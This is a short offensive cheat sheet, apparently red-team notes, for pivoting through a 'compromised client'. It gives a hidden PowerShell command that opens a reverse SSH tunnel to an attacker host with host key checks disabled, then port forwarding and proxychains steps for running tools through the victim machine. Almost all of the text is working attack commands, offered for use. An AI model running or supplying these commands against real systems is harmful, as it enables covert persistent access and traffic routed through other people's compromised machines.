### Start ssh connection on compromised client
```
Start-Process -FilePath "powershell" -ArgumentList " -w hidden -c ssh -p 22 -o 'StrictHostKeyChecking=no' -i $HOME\.ssh\<privateKey> -N -R 9051 <user>@<sshRhost>"
```

### Connect to tunnel
```
ssh -N -L 127.0.0.1:9050:127.0.0.1:9051 <user>@<sshRhost>
```

### Add DNS resolver to proxy
```
/usr/lib/proxychains3/proxyresolv
```

### Execute tools on attacker machine
```
proxychains firefox
```

